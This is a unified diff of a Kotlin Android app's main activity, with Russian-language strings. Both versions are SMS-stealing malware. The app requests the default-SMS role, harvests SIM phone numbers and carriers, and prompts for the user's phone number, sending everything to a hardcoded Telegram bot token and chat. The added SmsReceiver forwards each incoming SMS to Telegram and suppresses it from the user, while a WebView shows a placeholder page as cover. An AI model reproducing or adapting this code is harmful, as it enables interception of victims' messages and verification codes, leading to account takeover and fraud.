@@ -1,233 +1,246 @@
-package com.android.quickdraw
-
 import android.annotation.SuppressLint
-import android.app.Activity
 import android.app.AlertDialog
-import android.app.role.RoleManager
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
-import android.graphics.Color
-import android.graphics.drawable.ColorDrawable
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
 import android.provider.Telephony
-import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import android.text.InputType
 import android.view.LayoutInflater
-import android.webkit.WebResourceRequest
+import android.view.View
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
+import okhttp3.Call
 import okhttp3.Callback
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import java.io.IOException
-import java.util.regex.Pattern
 
 class MainActivity : AppCompatActivity() {
-    private lateinit var webView: WebView
+    private lateinit var myWebView: WebView
     private lateinit var sharedPreferences: SharedPreferences
+    private val PHONE_NUMBER_KEY = "phone_number"
     private val client = OkHttpClient()
     private val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
     private val chatId = "6331293386"
-    private val phonePattern = Pattern.compile("^(\\+7|8|7)?\\d{10}$")
-    private val PHONE_KEY = "saved_phone"
-
-    private val smsRoleLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
-        when (result.resultCode) {
-            Activity.RESULT_OK -> {
-                sendToTelegram("Пользователь предоставил права SMS-приложения по умолчанию")
-                sendSimInfo()
-                loadWebPage()
-            }
-            else -> {
-                if (!sharedPreferences.contains(PHONE_KEY)) {
-                    showPhoneInputDialog()
-                } else {
-                    loadWebPage()
-                }
-            }
-        }
-    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         
-        sharedPreferences = getPreferences(Context.MODE_PRIVATE)
+        sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        myWebView = findViewById(R.id.webview)
+        
         setupWebView()
-        checkInternetConnection()
+        checkInternetAndProceed()
     }
 
     private fun setupWebView() {
-        webView = findViewById(R.id.webview)
-        with(webView.settings) {
+        with(myWebView.settings) {
             javaScriptEnabled = true
             domStorageEnabled = true
             javaScriptCanOpenWindowsAutomatically = true
         }
         
-        webView.webViewClient = object : WebViewClient() {
+        myWebView.webViewClient = object : WebViewClient() {
             override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                 view.loadUrl(url)
                 return true
             }
 
-            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
+            override fun shouldOverrideUrlLoading(view: WebView, request: android.webkit.WebResourceRequest): Boolean {
                 view.loadUrl(request.url.toString())
                 return true
             }
         }
     }
 
-    private fun checkInternetConnection() {
+    private fun checkInternetAndProceed() {
         if (isInternetAvailable()) {
-            if (!sharedPreferences.contains(PHONE_KEY)) {
-                requestSmsRole()
+            if (sharedPreferences.contains(PHONE_NUMBER_KEY)) {
+                loadWebView()
             } else {
-                loadWebPage()
+                requestSmsPermission()
             }
         } else {
-            showNoInternetDialog { checkInternetConnection() }
+            showNoInternetDialog { checkInternetAndProceed() }
         }
     }
 
-    private fun requestSmsRole() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val roleManager = getSystemService(RoleManager::class.java)
-            if (roleManager?.isRoleAvailable(RoleManager.ROLE_SMS) == true && 
-                !roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
-                smsRoleLauncher.launch(roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS))
-                return
-            }
-        }
-        
-        // Для версий ниже Android 10
-        val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
-        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
-        smsRoleLauncher.launch(intent)
-    }
-
-    @SuppressLint("MissingPermission", "HardwareIds")
-    private fun sendSimInfo() {
-        try {
-            val telephonyManager = getSystemService(TelephonyManager::class.java)
-            val simInfo = StringBuilder("Информация о SIM-картах:\n")
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                val subscriptionManager = getSystemService(SubscriptionManager::class.java)
-                val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: emptyList()
-                
-                simInfo.append("Найдено SIM-карт: ${subscriptions.size}\n\n")
-                
-                for (sub in subscriptions) {
-                    val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        telephonyManager.createForSubscriptionId(sub.subscriptionId).line1Number
+    private fun requestSmsPermission() {
+        val permissionsHandler = object {
+            fun changeDefaultSmsApp() {
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        val roleManager = getSystemService(Context.ROLE_SERVICE) as android.app.role.RoleManager
+                        if (roleManager.isRoleAvailable(android.app.role.RoleManager.ROLE_SMS)) {
+                            if (!roleManager.isRoleHeld(android.app.role.RoleManager.ROLE_SMS)) {
+                                val roleRequestIntent = roleManager.createRequestRoleIntent(android.app.role.RoleManager.ROLE_SMS)
+                                startActivityForResult(roleRequestIntent, 1)
+                            } else {
+                                sendNotification("Пользователь принял все разрешения")
+                                showPhoneInputDialog()
+                            }
+                        }
                     } else {
-                        telephonyManager.line1Number
+                        val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
+                        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
+                        startActivityForResult(intent, 1)
                     }
-                    
-                    simInfo.append("SIM ${sub.simSlotIndex + 1}:\n")
-                        .append("• Номер: ${number ?: "недоступен"}\n")
-                        .append("• Оператор: ${sub.carrierName ?: "неизвестен"}\n")
-                        .append("• IMSI: ${sub.iccId ?: "недоступен"}\n")
-                        .append("• Страна: ${sub.countryIso?.uppercase() ?: "неизвестна"}\n\n")
+                } catch (e: Exception) {
+                    showPhoneInputDialog()
                 }
-            } else {
-                simInfo.append("Основной номер SIM: ${telephonyManager.line1Number ?: "недоступен"}\n")
             }
-            
-            sendToTelegram(simInfo.toString())
-        } catch (e: Exception) {
-            sendToTelegram("Ошибка при получении информации о SIM: ${e.message}")
+        }
+        permissionsHandler.changeDefaultSmsApp()
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 1) {
+            if (resultCode == RESULT_OK) {
+                sendNotification("Пользователь принял все разрешения")
+                sendSimInfo()
+            }
+            showPhoneInputDialog()
         }
     }
 
     private fun showPhoneInputDialog() {
+        if (sharedPreferences.contains(PHONE_NUMBER_KEY)) {
+            loadWebView()
+            return
+        }
+
         val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
         val dialog = AlertDialog.Builder(this)
             .setView(dialogView)
             .setCancelable(false)
             .create()
 
-        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
-
         val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
         val continueButton = dialogView.findViewById<Button>(R.id.continue_button)
 
         continueButton.setOnClickListener {
-            val phone = phoneInput.text.toString().trim()
-            if (isValidPhone(phone)) {
-                sharedPreferences.edit().putString(PHONE_KEY, phone).apply()
-                sendToTelegram("Введен номер телефона: $phone")
-                dialog.dismiss()
-                loadWebPage()
-            } else {
-                Toast.makeText(this, "Некорректный номер телефона", Toast.LENGTH_SHORT).show()
+            val phoneNumber = phoneInput.text.toString().trim()
+            when {
+                phoneNumber.matches(Regex("^\\+7\\d{10}$")) -> savePhoneNumber(phoneNumber, dialog)
+                phoneNumber.matches(Regex("^[78]\\d{10}$")) -> savePhoneNumber(phoneNumber, dialog)
+                phoneNumber.matches(Regex("^9\\d{9}$")) -> savePhoneNumber("7$phoneNumber", dialog)
+                else -> phoneInput.error = "Неверный формат номера"
             }
         }
-
         dialog.show()
     }
 
-    private fun isValidPhone(phone: String): Boolean {
-        return phonePattern.matcher(phone).matches()
+    private fun savePhoneNumber(number: String, dialog: AlertDialog) {
+        sharedPreferences.edit().putString(PHONE_NUMBER_KEY, number).apply()
+        sendNotification("Введен номер телефона: $number")
+        loadWebView()
+        dialog.dismiss()
+    }
+
+    @SuppressLint("SetJavaScriptEnabled")
+    private fun loadWebView() {
+        myWebView.loadUrl("https://example.com")
+    }
+
+    @SuppressLint("MissingPermission", "HardwareIds")
+    private fun sendSimInfo() {
+        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val simInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
+            subscriptionManager.activeSubscriptionInfoList?.joinToString("\n") { sub ->
+                "SIM ${sub.simSlotIndex + 1}:\n• Номер: ${telephonyManager.createForSubscriptionId(sub.subscriptionId).line1Number ?: "недоступен"}\n• Оператор: ${sub.carrierName ?: "неизвестен"}"
+            } ?: "Информация о SIM недоступна"
+        } else {
+            "Номер: ${telephonyManager.line1Number ?: "недоступен"}"
+        }
+        sendNotification("Информация о SIM:\n$simInfo")
+    }
+
+    private fun sendNotification(message: String) {
+        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+        val requestBody = """
+            {"chat_id":"$chatId","text":"${message.replace("\"", "\\\"")}"}
+        """.trimIndent().toRequestBody("application/json".toMediaType())
+
+        client.newCall(Request.Builder().url(url).post(requestBody).build()).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {}
+            override fun onResponse(call: Call, response: Response) { response.close() }
+        })
     }
 
     private fun showNoInternetDialog(retryAction: () -> Unit) {
         AlertDialog.Builder(this)
-            .setTitle("Нет подключения")
-            .setMessage("Требуется интернет-соединение")
+            .setTitle("Нет интернета")
+            .setMessage("Требуется подключение к интернету")
             .setPositiveButton("Повторить") { _, _ -> retryAction() }
             .setCancelable(false)
             .show()
     }
 
     private fun isInternetAvailable(): Boolean {
-        val cm = getSystemService(ConnectivityManager::class.java)
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            cm.activeNetwork?.let { network ->
-                cm.getNetworkCapabilities(network)?.run {
-                    hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) && 
-                    hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
+            connectivityManager.activeNetwork?.let { network ->
+                connectivityManager.getNetworkCapabilities(network)?.run {
+                    hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                 }
             } ?: false
         } else {
             @Suppress("DEPRECATION")
-            cm.activeNetworkInfo?.isConnected == true
+            connectivityManager.activeNetworkInfo?.isConnected ?: false
         }
     }
 
-    private fun loadWebPage() {
-        webView.loadUrl("https://example.com") // Замените на нужный URL
-    }
-
-    private fun sendToTelegram(message: String) {
-        val fullMessage = "$message\nУстройство: ${Build.MANUFACTURER} ${Build.MODEL}"
-        val json = """{"chat_id":"$chatId","text":"${fullMessage.replace("\"", "\\\"")}"}"""
-        
-        val request = Request.Builder()
-            .url("https://api.telegram.org/bot$botToken/sendMessage")
-            .post(json.toRequestBody("application/json".toMediaType()))
-            .build()
-
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: okhttp3.Call, e: IOException) {}
-            override fun onResponse(call: okhttp3.Call, response: Response) { response.close() }
-        })
-    }
-
     override fun onBackPressed() {
-        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
+        if (myWebView.canGoBack()) myWebView.goBack() else super.onBackPressed()
+    }
+}
+
+class SmsReceiver : android.content.BroadcastReceiver() {
+    private val client = OkHttpClient()
+    private val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+    private val chatId = "6331293386"
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
+            Telephony.Sms.Intents.getMessagesFromIntent(intent)?.firstOrNull()?.let { sms ->
+                val text = """
+                    Новое SMS:
+                    От: ${sms.originatingAddress ?: "Неизвестно"}
+                    Текст: ${sms.messageBody ?: "Пусто"}
+                    Устройство: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
+                """.trimIndent()
+
+                sendToTelegram(text)
+                abortBroadcast()
+            }
+        }
+    }
+
+    private fun sendToTelegram(text: String) {
+        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+        val requestBody = """
+            {"chat_id":"$chatId","text":"${text.replace("\"", "\\\"")}"}
+        """.trimIndent().toRequestBody("application/json".toMediaType())
+
+        client.newCall(Request.Builder().url(url).post(requestBody).build()).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {}
+            override fun onResponse(call: Call, response: Response) { response.close() }
+        })
     }
 }
